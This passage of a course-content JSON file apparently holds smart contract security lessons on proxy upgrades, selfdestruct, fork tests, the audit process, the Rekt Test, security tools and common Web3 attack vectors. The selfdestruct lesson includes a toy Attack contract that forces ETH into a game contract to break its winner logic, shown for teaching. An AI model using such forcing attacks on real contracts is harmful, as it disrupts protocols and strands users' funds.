`SmallProxy.sol`, passing it `ImplementationA`'s address as an argument\n3. acquire the data needed for the transaction being sent\n   > By passing `777` to our `getDataToTransact()` function we have returned: `0x552410770000000000000000000000000000000000000000000000000000000000000309` this encodes the `function signature` with the passed arguement of `777`.\n\nWhen this is passed to our proxy contract, the contract won't recognize the function signature, will call `fallback()` (which calls `_delegate()`) and pass the data to our implementation contract which DOES recognize this data!\n\n4. Send transaction with the data\n\nNow, when we call the `readStorage()` function, we can see that the value on our proxy contract has indeed been set to `777`!\n\nThis is a great illustration of how data is routed from our proxy contract to the implementation contract. Let's see what happens when we upgrade things by changing the implementation contract.\n\nIf we deploy a new implementation:\n\n```js\ncontract ImplementationB {\n    uint256 public value;\n\n    function setValue(uint256 newValue) public {\n        value = newValue + 2;\n    }\n}\n```\n\n...and subsequently pass this new address to our proxy's `setImplementation()` function...\n\n```js\nfunction setImplementation(address implementationB);\n```\n\nWhen we then pass the same data as before to our proxy contract, we can indeed see this is reaching `implementationB` and we're having returned `newValue +2`!\n\n<img src=\"/security-section-1/12-upgradeable/upgrades3.png\" style=\"width: 100%; height: auto;\" alt=\"block fee\">\n\n---\n\n### Wrap up\n\nNow, with this understanding in hand, it's easy to see the power proxies hold. On one hand, they are very convenient and afford developers some safeguard if things should need to change. On the other - if this process is controlled by a single (or small group) of wallets, this opens the door to some high risk centralization concerns.\n\nNext, we'll be looking at `selfDestruct` and how it can be used to circumvent intended contract funtionality!\n",
          "updates": []
        },
        {
          "lessonId": "69e4923d-69e2-4b4e-9856-272cf26ae896",
          "number": 13,
          "title": "Self Destruct",
          "slug": "self-destruct",
          "folderName": "13-self-destruct",
          "description": "Understand the use and implications of the selfdestruct keyword in Solidity. This lesson explains how selfdestruct can remove contracts and force ETH into specified addresses, a unique behavior with significant impact on contract functionality and security.",
          "duration": 10,
          "videoUrl": "y16ZuIMXnksLcdt7e001joR3NOYorDkw01mkxf6Trp00hc",
          "rawMarkdownUrl": "/routes/security/1-review/13-self-destruct/+page.md",
          "markdownContent": "---\ntitle: Self-destruct\n---\n\n_follow along with the video_\n\n---\n\n## Forever On-chain ... mostly\n\nThe next concept I want you to know is that of the `selfdestruct()` keyword in Solidity. In essence this keyword will destroy, or delete a contract.\n\n## The Unique Characteristic of Selfdestruct\n\nWhy `selfdestruct` stands out lies in its exceptional behavior once a contract gets destroyed. Any Ethereum (or ETH) residing within the deleted contract gets automatically â€˜pushedâ€™ or â€˜forcedâ€™ into any address that you specify.\n\nUnder normal circumstances a contract that doesn't contain a receive or fallback function (or some other payable function capable of receiving funds) cannot have ETH sent to it.\n\nOnly through the use of `selfdestruct` can you be permitted to push any Ethereum into such a contract.\n\nSo if ever youâ€™re hunting for an exploit, or you have identified an attack where you need to force ETH into a contract, `selfdestruct` will be your instrument of choice.\n\n## `selfdestruct` in Action\n\nTo get a clear understanding, letâ€™s put these into practice. Starting with a code base from [Solidity by example](https://solidity-by-example.org/hacks/self-destruct/) - and then carrying it into Remix, we will be able to observe this concept directly in action.\n\n```js\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// The goal of this game is to be the 7th player to deposit 1 Ether.\n// Players can deposit only 1 Ether at a time.\n// Winner will be able to withdraw all Ether.\n\n/*\n1. Deploy EtherGame\n2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.\n2. Deploy Attack with address of EtherGame\n3. Call Attack.attack sending 5 ether. This will break the game\n   No one can become the winner.\n\nWhat happened?\nAttack forced the balance of EtherGame to equal 7 ether.\nNow no one can deposit and the winner cannot be set.\n*/\n\ncontract EtherGame {\n    uint public targetAmount = 7 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, \"You can only send 1 Ether\");\n\n        uint balance = address(this).balance;\n        require(balance <= targetAmount, \"Game is over\");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, \"Not winner\");\n\n        (bool sent, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    EtherGame etherGame;\n\n    constructor(EtherGame _etherGame) {\n        etherGame = EtherGame(_etherGame);\n    }\n\n    function attack() public payable {\n        // You can simply break the game by sending ether so that\n        // the game balance >= 7 ether\n\n        // cast address to payable\n        address payable addr = payable(address(etherGame));\n        selfdestruct(addr);\n    }\n}\n\n```\n\nLooking closely at the above contracts, we can see that `EtherGame` requires `address(this).balance == targetAmount`. The expectation of the protocol is that any user can only deposit 1ETH and each deposit transaction is checked as a winner.\n\nCan you think of how we'd break these invariants?\n\nBy leveraging `selfdestruct(payable(address(etherGame)));` on our `Attack` contract, we can force ETH to the `EtherGame` contract that isn't accounted for.\n\n```js\nif (balance == targetAmount) {\n  winner = msg.sender;\n}\n```\n\nBy forcing enough ETH to `EtherGame` we can assure the above condition is never met and a winner is never decided!\n\n## Conclusion\n\nThe `selfdestruct()` function is powerful. It's one of the only ways to force a contract to receive ETH that it doesn't want and in so doing exists as an attack vector for any protocol not prepared for it.\n",
          "updates": []
        },
        {
          "lessonId": "bb5432c8-381c-4143-9c43-d37769c15557",
          "number": 14,
          "title": "Fork Tests",
          "slug": "fork-tests",
          "folderName": "14-fork-tests",
          "description": "This final lesson guides you through the process of conducting fork tests, creating a simulated version of the mainnet for testing purposes. It covers the use of tools like Alchemy URL and practical exercises to solidify your understanding of Solidity and smart contract development.",
          "duration": 6,
          "videoUrl": "xIGaLqCsO54VGZN46tCho9Eu1EQVa5P4tZUILwZx60100",
          "rawMarkdownUrl": "/routes/security/1-review/14-fork-tests/+page.md",
          "markdownContent": "---\ntitle: Fork Tests & Congrats!\n---\n\n_follow along with the video_\n\n---\n\n## Forking Mainnet\n\nForking is a valuable tool is a developer's box, it effectively takes a reference snapshot at a given block height on the provided chain. In practice, this allows us to interact with protocols as though we were interacting with them on mainnet.\n\n## Fork Tests in Foundry\n\n```bash\nforge test fork-url $MAINNET_RPC_URL\n```\n\nThis command in foundry tells the framework to run your tests while referencing a fork of the provided RPC URL, allowing you to interact with mainnet contract locally.\n\nAnother way to fork is within the test contract directly.\n\n```js\nfunction setUp() public {\n    vm.createSelectFork({blockNumber: 0, urlOrAlias: \"mainnet\"})\n}\n```\n\n> Note: `mainnet` will need to be set as an alias in your `foundry.toml` under a new variable `[rpc_endpoints]`\n\n```js\n[rpc_endpoints];\nmainnet = \"{MAINNET_RPC_URL}\";\n```\n\nWith the above in place running the following will run your tests with respect to a fork of a live chain!\n\n```bash\nforge test\n```\n\n## Useful Resources &amp; Exercises\n\nIf any concepts covered in this blog post seem confusing or new to you, take a moment to check out the Foundry Full Course here on Updraft ([**Foundry Fundamentals**](https://updraft.cyfrin.io/courses/foundry) & [**Advanced Foundry**](https://updraft.cyfrin.io/courses/advanced-foundry)) to level up those concepts and give you all the information you need to succeed here. These resources will expedite your learning and help you solidify the fundamental concepts.\n\nBefore signing off, I'd encourage you to join the [Cyfrin Discord](https://discord.com/invite/NhVAmtvnzr). This is an excellent platform where you can connect, collaborate, and share insights with a diverse group of people working on similar goals.\n\nIn addition to this, check out the [**Discussions on GitHub**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/discussions) - this is a phenomenal place to get support and have your questions answered in a way that will be indexed by search engines and AI in an effort to improve the experience for people coming behind us.\n\n<img src=\"/security-section-1/14-fork-tests/forking1.png\" style=\"width: 100%; height: auto;\" alt=\"block fee\">\n\nCongratulations on finishing the refresher! Take a break, you greatly deserve it for getting this far!\n\n---\n\nSection 1 NFT Challenge ðŸ‘€\n\n[Refresher NFT (Arb)](https://arbiscan.io/address/0x7a0f40757f6ba868b44ce959a1d4b8bc22c21d59)\n\n[Refresher NFT (Sepolia)](https://sepolia.etherscan.io/address/0x76d2403b80591d5f6af2b468bc14205fa5452ac0)\n",
          "updates": []
        }
      ]
    },
    {
      "number": 2,
      "sectionId": "1645f5be-0f61-49bc-aba5-9485020053bd",
      "title": "What is a smart contract audit",
      "slug": "audit",
      "folderName": "2-audit",
      "lessons": [
        {
          "lessonId": "5a691a25-f2f3-4e52-a6d6-7fbb09d85976",
          "number": 1,
          "title": "What is a smart contract audit?",
          "slug": "what-is-an-audit",
          "folderName": "1-what-is-an-audit",
          "description": "This lesson delves into what a smart contract audit, or more accurately, a security review, truly entails. It discusses the three phases of a security review, the importance of these reviews in ensuring code security on immutable blockchain systems, and effective techniques used in the process. The lesson also emphasizes the distinction between the terms 'audit' and 'security review' and their implications in the context of blockchain and smart contracts.",
          "duration": 10,
          "videoUrl": "XQFbLD01uq85UnD00r4HRqNTLJR1N2SXmGzFieV5TaOi8",
          "rawMarkdownUrl": "/routes/security/2-audit/1-what-is-an-audit/+page.md",
          "markdownContent": "---\ntitle: What is a Smart Contract Audit?\n---\n\n_Follow along with this video:_\n\n##\n\n---\n\nYou might think you've got a grip on what a smart contract audit is all about, but this lesson aims to help you dive deeper and truly comprehend the whole process. Brace yourself, as today we are stepping into the interesting realm of security reviews.\n\nLet's start off by stating that the term \"smart contract audit\" is a bit of a misnomer. As a more appropriate alternative, I am a stout advocate of \"security review.\" I even have a T-shirt to prove my allegiance!\n\nYou might be wondering why this change of terms is required. Well, itâ€™s because the term 'audit' might wrongly insinuate some kind of guarantee or even encompass legal implications. A security review, being free of these misconceptions, exudes the essence of what we are actually doing: looking for as many bugs as possible to ensure maximum code security.\n\n> Note: Despite this, many protocols still insist on requesting a \"smart contract audit,\" so it's eminent to know that the terms are interchangeable. When you hear \"security review\", think \"smart contract audit\" and vice versa. Protocols are often unaware of these nuances, but you, as a trained security researcher, know better!\n\nBy now, I hope you're questioning with anticipation: \"What does a security review entail?\"\n\n## The Three Phases of a Security Review\n\nRight in our GitHub repository, we detail the three phases of a security review and what that process looks like.\n\n    1. Initial Review\n            a. Scoping\n            b. Reconnaissance\n            c. Vulnerability identification\n            d. Reporting\n    2. Protocol fixes\n            a. Fixes issues\n            b. Retests and adds tests\n    3. Mitigation Review\n            a. Reconnaissance\n            b. Vulnerability identification\n            C. Reporting\n\nTo give you a heads-up, there really isn't a \"one-size-fits-all\" approach to smart contract auditing. There are several unique strategies, each bringing a different set of pros and cons to the table.\n\nIn this course we'll discuss two particularly effective techniques, `\"the Tincho\"` and `\"the Hans\"`, to help familiarize you with the process. However, remember that these are just examples; there isnâ€™t a definitive, \"correct\" way of performing a security review.\n\nBefore we delve into the specifics, let's discuss why security reviews are critical.\n\n## Importance of Security Reviews\n\n> A smart contract audit is a timeboxed, security based review of your smart contract system. An auditor's goal is to find as many vulnerabilities as possible and educate the protocol on ways to improve their codebase security and coding best-practices moving forward.\n\nAs code deployed to a blockchain is immutable, itâ€™s crucial that it's error-free before deployment. The permissionless and adversarial nature of the blockchain means that protocols need to be ready to repel malicious users. Failure to do so can lead to hefty monetary losses, as evidenced by the nearly $4 billion stolen due to smart contract vulnerabilities last year.\n\nThe benefits of conducting a security review go beyond just minimizing vulnerabilities.\n\nIt also aids protocol developers in enhancing their understanding of the code itself, thereby accelerating feature implementation and increasing effectiveness. A security review can also familiarize your team with the latest trends and tooling in the space.\n\nOften a single audit won't be enough, protocols are really entering into a security journey which may include:\n\n- Formal Verification\n- Competitive Audits\n- Mitigation Reviews\n- Bug Bounty Programs\n\nWith this understanding, let's familiarize ourselves with the process of a typical audit.\n\n### Reach Out for a Review\n\nThe review process begins when a protocol reaches out, be it before or after their code is complete. After they make contact, it's important to determine the cost of a review based on things like:\n\n- Code Complexity/nSLOC\n- Scope\n- Duration\n- Timeline\n\nLines of Code: Duration\n\n- 100 : 2.5days\n- 500 : 1 Week\n- 1000 : 1-2 Weeks\n- 2500 : 2-3 Weeks\n- 5000 : 3-5 Weeks\n- 5000+: 5+ weeks\n\nTake this with a lot of salt though, as these timelines vary largely based on circumstance.\n\nWith the submission of a `commit hash` and `down payment` by the protocol and start date can be set!\n\n> Note: The `commit hash` is the unique ID of the codebase an auditor will be working with.\n\n### Audit Begins\n\nNow that the admin work is done, auditors can roll up their sleeves and get to work. Using everything in their arsenal, they will strive to find as many vulnerabilities as possible in your code.\n\n### Initial Report\n\nOnce the review period is over, the auditors compile an initial report. This report includes all findings, categorized according to severity\n\n- High\n- Medium\n- Low\n- Information/Non-critical\n- Gas Efficiencies\n\nHigh, medium and low findings have their severity determined by the impact and likelihood of an exploit.\n\nInformational/Non-Critical and Gas are findings focused on improving the efficiency of your code, code structure and best practices. These aren't vulnerabilities, but ways to improve your code.\n\n### Mitigation Phase\n\nThe protocol's team then has a fixed period to address the vulnerabilities found in the initial audit report. More often than not, they can simply implement the recommendations provided by the auditors.\n\n### Final Report\n\nUpon completion of the mitigation phase, the audit team compiles a final audit report focusing exclusively on the fixes made to address the initial report's issues. Hopefully, this cements a strong relationship between the protocol and the audit team, fostering future collaborations to keep Web3 secure.\n\n## Ensuring a Successful Audit\n\nFor an audit to be as successful as possible, you should ensure that there's:\n\n- Good documentation\n- A solid test suite\n- Clear and readable code\n- Modern best practices are followed\n- Clear communication channels\n- An initial video walkthrough of the code\n\nBy considering auditors as an extension of your team, maintaining an open channel of communication, and providing them with the necessary documentation and context, you ensure the audit process is smoother and more accurate, providing auditors valuable context of the codebase.\n\n## Post Audit\n\nLastly, remember that a smart contract audit is an integral part of a security journey rather than an endpoint. Even after an audit, any subsequent code changes need to be reviewed as the new code is unaudited, regardless of the size of the change.\n\n> Remember: One audit might not be enough. Getting more eyes on your code is only going to increase the chances of catching vulnerabilities before it's too late\n\n## What an audit _isn't_\n\nGoing through a security review does not mean that your code is bug free. Security is a continuous process tha tis always evolving.\n\n## In Closing\n\nThis should have provided you a high-level understanding of what a security review is, what it's comprised of and what to expect while performing one.\n\nWe'll detail some of the specific differences between `competitive` and `private` audits in a later section.\n\n> \"There is no silver bullet in smart contract auditing. But understanding the process, methods, and importance of regular security reviews can significantly enhance your protocol's robustness.\"\n",
          "updates": []
        },
        {
          "lessonId": "66f3d1fb-3ed8-4a12-9164-49b28b28281a",
          "number": 2,
          "title": "The audit process",
          "slug": "the-audit",
          "folderName": "2-the-audit",
          "description": "This lesson offers a comprehensive guide to the smart contract audit process, outlining the key steps from initial context gathering to the final mitigation review. It highlights the importance of embedding security audits throughout the development lifecycle, following the OWASP guide, to ensure the continuous security of smart contracts.",
          "duration": 5,
          "videoUrl": "Um3uQhbBS2PBoz01L9dAdJAZ8m3EtU7KNdIX7Xjp02T0200",
          "rawMarkdownUrl": "/routes/security/2-audit/2-the-audit/+page.md",
          "markdownContent": "---\ntitle: The Audit (Security Review Process)\n---\n\n_Follow along with this video:_\n\n---\n\nWhen developing smart contracts, understanding and following the audit process is a crucial step towards achieving a more secure protocol. Here, we'll outline an example of this process.\n\n## High-Level Overview of The Audit Process\n\nThe smart contract audit process can be briefly summed up in these steps:\n\n1. **Get Context**: Understand the project, its purpose and its unique aspects.\n2. **Use Tools**: Employ relevant tools to scan and analyze the codebase.\n3. **Manual Reviews**: Make a personal review of the code and spot out unusual or vulnerable code.\n4. **Write a Report**: Document all findings and recommendations for the development team.\n\nTo illustrate how this pans out in reality, we can look at the Tincho method used to audit ENS â€“ a process that landed him a cool $100,000 payout! We'll delve into this later on.\n\n## Breakdown of the Audit Process\n\nFor a more detailed perspective, letâ€™s consider the process as broken into three distinct phases:\n\n**Initial Review:** The initial review of a protocol can also be broken down into 4 distinct phases.\n\n- Scoping - This is getting a sense of the protocol. In this phase, auditors go through the code to scope it. This gives an idea of how much time might be required for the audit, which can then be used to establish pricing. Key tasks include identification of all the contractâ€™s dependencies and a general overview of the code. At this stage, auditors donâ€™t dig deep into anything yet.\n- Reconnaissance - Here an auditor starts walking through the code, running tools, interacting with the protocol in an effort to break it.\n- Vulnerability Identification - An auditor determines which vulnerabilities are present and how they're exploited as well as mitigation.\n- Reporting - Compile a report detailing all of the identified vulnerabilities and recommendations to make the protocol more secure.\n\n> \"Your job is to do whatever it takes to make the protocol more secure.\"\n\n**Protocol Fixes:** At this stage the protocol will take an auditor's report and work towards implementing suggested changes and mitigation. The length of time of this period can vary based on complexity of the issues, number of vulnerabilities identified and more.\n\n**Mitigation Review:** Once a protocol has employed and tested all of the recommended fixes, a review is conducted with a focus on verifying that previously reported vulnerabilities have been resolved.\n\nYour ultimate aim should be to make the protocol more secure. Therefore, ensure to take notes of all findings and steps and elaborate it in your report.\n\n> Difference in Audit Types: Note that the aforementioned process details a private audit or a traditional security review. For competitive audits, you are typically optimized for time and identifying as many high vulnerabilities as possible.\n\nRemember, the goal of conducting contract audits isn't simply to tick a box. It's about ensuring the security and smooth running of the smart contract at all stages of its lifecycle. The more audits you conduct, the better you become at identifying potential security issues.\n\n<div style=\"text-align:center\">\n<img src=\"../../../../static/security-section-2/2-the-audit/the-audit1.png\" style=\"width: 75%; height: auto;\">\n</div>\n\n## Embedding Security Audits in Development Lifecycle\n\nThe process of developing a smart contract follows a lifecycle too. According to the [OWASP](https://www.owasp.org/index.php/Main_Page) (The Open Web Application Security Project) guide, security isn't just a one-off step but a part of your ongoing smart contract journey. It is about fostering the mindset that security is continuous. The smart contract developer lifecycle entails the following stages:\n\n1. **Plan and Design**\n2. **Develop and Test**\n3. **Get an Audit**\n4. **Deploy**\n5. **Monitor and Maintain**\n\nOWASP strongly emphasizes that embedding security considerations into all stages of your Development Lifecycle is what it takes to build a secure decentralized application, not just conducting a one time smart contract â€œcheck.â€ Before deploying your contract, think hard about the security measures in place and ensure to maintain and monitor your code post-deployment.\n\nWhile a smart contract security audit is an absolute necessity, also ensure to plan for any contingencies post-deployment. The key takeaway here is this: Smart contract security is a crucial part of the smart contract development lifecycle and should be treated with as much care as the development of the smart contract itself.\n",
          "updates": []
        },
        {
          "lessonId": "92351a2d-d6b4-4e2b-bcb5-885069e268d7",
          "number": 3,
          "title": "Rekt test",
          "slug": "rekt-test",
          "folderName": "3-rekt-test",
          "description": "This lesson introduces the Rekt Test, a set of critical questions designed to assess a protocol's readiness for a security audit. Covering aspects like documentation, security roles, and protective measures, it serves as a foundational checklist for developers to gauge if their protocols are prepared for thorough security evaluations.",
          "duration": 4,
          "videoUrl": "o8pD01qyek02l5jZzhkuYQUPMk1RosmjfV28tzk6N02Wqc",
          "rawMarkdownUrl": "/routes/security/2-audit/3-rekt-test/+page.md",
          "markdownContent": "---\ntitle: Rekt Test\n---\n\n_Follow along with this video:_\n\n---\n\n## Audit Readiness\n\nThe concept that once you've had an audit done, you're ready to ship - is wrong. There are two tests that I tell everyone to look at prior to getting a security review one is the [**nacentxyz simple-security-toolkit**](https://github.com/nascentxyz/simple-security-toolkit) and the other is [**The Rekt Test**](https://blog.trailofbits.com/2023/08/14/can-you-pass-the-rekt-test/), by Trail of Bits.\n\n### The Rekt Test\n\nThe Rekt Test is highly important as it poses a set of questions to gauge your protocol's preparedness for an audit. This tool forces you to think about security measures from a more proactive angle. Should your protocols fail to answer these questions, the chances are that they're not audit-ready.\n\n<img src=\"/security-section-2/3-rekt/rekt1.png\" style=\"width: 100%; height: auto;\">\n\nThe questions touch on several aspects like documentation, security roles, security tools, and protective measures, among others. Here's a curated list:\n\n- **Do you have all actors roles and privileges documented?**\n- **Do you keep documentation of external services contracts and Oracles?**\n- **Do you have a written and tested incident response plan?**\n- **Do you document the best ways to attack your system?**\n- **Do you perform identity verification and background checks on all employees?**\n- **Do you have a team member with security defined in the role?**\n- **Do you require hardware security keys for production systems?**\n- **Do you define key invariants for your system and test them on every commit?**\n- **Do you use the best automated tools to discover security issues in your code?**\n- **Do you undergo external audits and maintain a vulnerability disclosure or bug bounty program?**\n- **Have you considered and mitigated avenues for abusing users of your system?**\n\nAs developers, you must be able to answer all these queries before you proceed with an audit. If you're dealing with a protocol that fails to answer these questions, it's best to tell them the protocol isn't ready to ship, or arguably audit, until they can.\n\n> \"Delegate responsibility to someone on your team for security - Give your project a sense of ownership and a point person to handle any security breaches.\"\n\n### Nascent Audit Readiness Checklist\n\n[**This**](https://github.com/nascentxyz/simple-security-toolkit) checklist is another effective method to assess if you're ready for an audit. Though it offers different perspectives, it's another tool that helps you determine if your protocols are prepared for audits.\n\n### Next Steps and Post Deployment\n\nWe'll later cover the important of Post Deployment Planning and all that entails, including:\n\n- Bug Bounty Programs\n- Disaster Recovery Drills\n- Monitoring\n\nThinking about the steps necessary _after_ deployment really frames a protocols security holistically and ensures readiness to deal with potential exploits and ability to respond quickly.\n",
          "updates": []
        },
        {
          "lessonId": "27302144-7410-43ef-939a-a772d20cbed8",
          "number": 4,
          "title": "Security Tools",
          "slug": "tools",
          "folderName": "4-tools",
          "description": "",
          "duration": 5,
          "videoUrl": "EKJ02V7fAflkO2wJLhBp8K4oztVnAY5vzb902OBL2znZM",
          "rawMarkdownUrl": "/routes/security/2-audit/4-tools/+page.md",
          "markdownContent": "---\ntitle: What tools do we use in Security Reviews?\n---\n\n_Follow along with this video:_\n\n---\n\n## Tools for Security Reviews\n\nLet's overview some of the tools we'll be using while performing security reviews. As we progress in the course, you'll get more hands on experience with how they work!\n\n### Your First Line of Defense: Test Suites\n\nYour classic test suite is your project's first line of defense. These are your frameworks like Foundry, Hardhat, Brownie, Apeworx - even Remix has tests.\n\n> _Rest in Peace Truffle_ ðŸ˜¢\n\nThis course covers some really robust test suites that you can model your tests after and we'll talk more about the concept of `test coverage` a little later on.\n\n## Static Analysis: Debugging Without Execution\n\nStatic analysis represents the next level of defense. This method automatically checks for issues without executing your code, hence the debugging process remains `static`. Slither, 4nalyzer, Mythril, and Aderyn are some prominent tools in the static analysis category.\n\nThroughout this course, we'll work heavily with Slither and Aderyn, you'll become experts at these static analysis options.\n\n## Fuzz Testing: Randomness Meets Tests\n\nNext we have Fuzz testing, which really comes in two flavours, `fuzz testing` and `stateful fuzz testing`.\n\n<img src=\"/security-section-2/4-tools/tools2.png\" style=\"width: 100%; height: auto;\">\n\nA few other types of testing we _won't_ be covering are `differential test` and `chaos tests`, but in an effort to further you security journey, you always want to be looking for new looks and expanding your knowledge, so you may want to check them out.\n\n## Formal Verification: Mathematical Proofs\n\nFormal verification is a broad term for deploying formal methods to affirm the correctness of hardware or software. Often, these methods involve converting the codebase into mathematical expressions and deploying mathematical proofs to authenticate that the code does or doesn't do something specific.\n\nA popular formal verification approach is symbolic execution. This method converts your Solidity function into math or a set of boolean expressions. Manticore, Certora, Z3 stand tall in this domain.\n\nWe will delve deeper into formal verification in later sections.\n\n## AI Tools: Not Quite There Yet\n\nLastly but importantly, AI tools offer another dimension to imagine code auditing functionalities. However, despite their potential, they have some distance to cover before they provide substantial value for securing a codebase. At present, using AI tools could serve as a sanity check or aid in looking for something quickly, but if a project suggests it has been audited by an AI tool like `ChatGPT`, it is best to be skeptical and question if the project takes security seriously.\n\nThere's a great GitHub repo by ZhangZhuoSJTU that illustrates examples of bugs that are detectable by machines and those that aren't. Check it out [**here**](https://github.com/ZhangZhuoSJTU/Web3Bugs).\n\n## Wrapping Up\n\nAn important takeaway for you is that around **80%** of actual bugs and competitive audit bugs are not auto-detectable by machines, _including our present-day AI tools_. This revelation underlines two key facts:\n\n1. Our current tools aren't up to the mark, and we need better ones.\n2. Human auditors and human security researchers remain paramount. The vast majority of bugs often stem from business logic and incorrect implementations rather than common solidity or cryptography oddities.\n\nYou'll learn more about this distinction as we continue in this course.\n",
          "updates": []
        },
        {
          "lessonId": "0c8d34f8-8bce-4d6c-9370-e85de0d4be31",
          "number": 5,
          "title": "What if a protocol I audit gets hacked?",
          "slug": "hacked",
          "folderName": "5-hacked",
          "description": "",
          "duration": 4,
          "videoUrl": "LVwtMj026jE4kCW6yEa3EVd8PPAuoKpANRGeDw902ClTs",
          "rawMarkdownUrl": "/routes/security/2-audit/5-hacked/+page.md",
          "markdownContent": "---\ntitle: What if I do a Security Review and the protocol gets hacked?\n---\n\n_Follow along with this video:_\n\n---\n\n# Penetrating the Scenario: What If Your Security Audit Fails?\n\nAs the world moves towards a more digital infrastructure, the importance of security audits cannot be overstated. But who carries the blame when these audits fail? Should it always land at the feet of those responsible for conducting the audit?\n\nWhile broaching upon this intricate subject, I recently had a pleasant chat with the legendary Tincho, who imparted an inspiring perspective. He offers valuable insights on the way we should perceive the role and responsibilities of auditors in these precarious scenarios. Below will be summaries based on his thoughts and perspective.\n\n## Redefining the Role of Auditors\n\nIn the eyes of many, the fundamental purpose of a security audit is to identify and rectify the most critical vulnerabilities in a system. However, Tincho encourages us to look beyond this simplistic view.\n\n> Auditors should provide value, regardless of whether or not they spot critical issues.\n\nIn other words, an auditor's value doesn't solely rest upon their ability to find vulnerabilities. Instead, their advice should strengthen the overall security protocol and offer pragmatic solutions for future scenarios.\n\nOf course, it goes without saying that the fewer critical vulnerabilities that are overlooked, the better - the safer Ethereum will be. It's naive however to believe that an auditor is solely responsible for when things go wrong.\n\n## Who Owns the Blame?\n\nThe notion of finding a scapegoat when a system is exploited is a regressive one.\n\n> A whole chain of events leads to the successful exploitation of a vulnerability.\n\nAttributing the failure of a system to an auditor's incompetency is simplistic and misguided. If a vulnerability was missed, it means it slipped past numerous stages of checks and balances, of which an audit is just one. When a flaw goes unnoticed for as long as four months, there are perhaps lapses in system monitoring and in many other security parameters.\n\n## The Auditorâ€™s Role in the Wake of a Breach\n\nSo, what should an auditor do if a protocol they've reviewed ends up compromised? The answer is that a responsible security partner should not abandon their client in the midst of a crisis.\n\nAs an auditor, you may be able to help mitigate the damage, restrict the scope of the attack, and possibly identify the hackers. A quality auditor must be there, lending their expertise, during the inevitable chaos that ensues after a breach.\n\n> \"If you are to be the trusted security partner of your clients, probably, when they are hacked, you want to be there. You want to be there supporting them.\" - Tincho\n\n## Conclusion\n\nSecurity is a journey.\n\nIt was great catching up with Tincho, whose outlook on security audits balances realism with the optimistic pursuit of improvement. Every party involved in a security protocol must work together as a team and learn from any failure to ensure a safer, more secure digital environment.\n",
          "updates": []
        },
        {
          "lessonId": "100452f0-5541-4c78-9d25-a8c86e433cfa",
          "number": 6,
          "title": "Top Web3 Attacks",
          "slug": "attacks",
          "folderName": "6-attacks",
          "description": "",
          "duration": 1,
          "videoUrl": "zwmJv9KnDfe8zgCio1oR00AM2w95AXpfXYWoqXxQEdjE",
          "rawMarkdownUrl": "/routes/security/2-audit/6-attacks/+page.md",
          "markdownContent": "---\ntitle: Top kinds of Attacks in Web3 Today\n---\n\n_Follow along with this video:_\n\n---\n\nAs I've mentioned a few times, we need to have this **attackers and defenders mindset**. We need to always be expanding our knowledge, we need to always be leveling up.\n\nAs we progress I'll be giving you a tonne of tools to learn and grow your skill set. In addition to this, there will be exercises throughout for you to continue to seek that knowledge and really commit it.\n\n### Unraveling the Top Attack Vectors\n\nLets consider the weakest parts of Web3 and remind everyone with the **â€œTop Attack Vectors.â€**\n\n1. **Private Keys** - Stolen Private Keys are responsible for the largest loss of funds so far in 2023 at `$243,000,000`\n2. **Reward Manipulation** â€“ This vector involves the manipulation of decentralized incentive systems that could disrupt the balance and fairness within a network. `$200,000,000` has been rugged so far this year.\n3. **Price Oracle Manipulation** â€“ This threat arises when a price oracle in centralized, or if a single oracle is relied upon, particularly with respect to price data. These vulnerabilities are responsible for `~$146,000,000` in losses in 2023.\n4. **Insufficient Access Controls** â€“ onlyOwner modifiers, multi-sig wallets - just a couple things that could have preventing `$17,000,000` in stolen funds this year.\n5. **Re-entrancy(and Read-Only Re-entrancy)** - by not adhering to proper Checks, Effects, Interactions patterns - protocols are still being rekt to the tune of `$20,500,000` combined in 2023.\n\nMillions more have been lost across various, well-documented, and preventable attack vectors. The situation clearly illustrates how education is half the battle.\n\nCollectively, we will tackle these bugbears and issues in our forthcoming security reviews.\n\n> Always remember, my friends - Cybersecurity isn't about the systems or the codes; it's about maintaining a mindset. A mindset akin to an endless game of chess, predicting the opponentâ€™s moves and always staying a step ahead.\n\n### Engaging in Persistent Learning and Improvement\n\nIn the forthcoming series of security audits, you'll get hands-on practice with data analysis, encryption methods, tackling suspicious scripts, and combating various cybersecurity threats. The exercises will stimulate your intellectual growth and help ingrain essential concepts into your tech-strategist mind.\n",
          "updates": []
        },
        {
          "lessonId": "42962aa0-116e-45ae-8c31-2d01d7313526",
          "number": 7,
          "title": "Recap",
          "slug": "recap",
          "folderName": "7-recap",
          "description": "",
          "duration": 3,
          "videoUrl": "8Htqm7N3yiDLZqakaXKmOhsbnAeYVOqv4BCJP8s8XVE",
          "rawMarkdownUrl": "/routes/security/2-audit/7-recap/+page.md",
          "markdownContent": "---\ntitle: Lesson 2 Recap\n---\n\n_Follow along with this video:_\n\n---\n\nCongratulations! You've come so far already, let's do a quick recap of what's been covered in this section.\n\n### The Basics of Smart Contract Audits\n\nA smart contract audit is a time-boxed security review, looking for security vulnerabilities. The goal here is to inform the protocol on how to be as secure as possible.\n\n### The Fundamentals of a Security Review\n\nThere's no `silver bullet` when it comes to how to perform a security review. Generally, a security review is divided into three stages:\n\n1. Initial review\n   - Scoping\n   - Reconnaissance\n   - Vulnerability Identification\n   - Reporting\n2. Protocol Fixes\n   - Protocol fixes issues\n   - Retests and adds tests for changes\n3. Mitigation Review\n   - Reconnaissance\n   - Vulnerability Identification\n   - Reporting\n\n### Smart Contract Development Life Cycle\n\nKeep in mind that ensuring security isnâ€™t only a crucial point in the smart contract development lifecycle, it's a continuous, never-ending process!\n\n- Plan & Design\n- Develop & Test\n- Smart Contract Audit & Post Deploy Planning\n- Deploy\n- Monitor & Maintain\n\n> \"_Security shouldn't just be an afterthought or some box you check. You need to have a security mindset from day one_\".\n\nThinking about post-deployment planning, monitoring and maintaining is just as important as the development itself.\n\n### Tooling for Security Review\n\nIn future posts, we'll be delving into the various tools utilized in conducting security reviews. Trust me, you'll need to get your hands dirty with tools like\n\nStatic Analysis\n\n- [Slither](https://github.com/crytic/slither)\n- 